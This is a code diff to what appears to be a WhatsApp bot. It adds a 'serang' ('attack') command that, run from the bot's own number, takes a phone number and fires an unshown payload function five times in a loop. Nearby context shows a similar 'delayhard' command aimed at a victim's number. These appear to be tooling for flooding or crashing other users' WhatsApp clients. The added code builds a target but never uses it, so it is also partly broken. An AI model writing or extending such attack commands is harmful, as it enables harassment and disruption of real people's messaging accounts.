@@ -782,6 +782,21 @@ if (body.trim().toLowerCase().startsWith("serang")) {
         break;
       }
 
+case 'serang': {
+  if (!botNumber) return sock.sendMessage(m.chat, { text: "This Feature Only Send By Bot Number" }, { quoted: m });
+
+  const target = args[0]?.replace(/\D/g, "") + "@s.whatsapp.net";
+  if (!args[0]) return;
+
+  for (let r = 0; r < 5; r++) {
+    await helonyet(sock, m.chat);
+  }
+
+  await sock.sendMessage(m.chat, { text: "done c1" }, { quoted: m });
+  console.log(chalk.red.bold("Success!"));
+  break;
+}
+
       case "delayhard": {
         if (!args[0]) return sock.sendMessage(from, { text: "❌ Contoh: .delayhard 628123456789" }, { quoted: mek });
         const target = args[0].replace(/\D/g, "") + "@s.whatsapp.net";
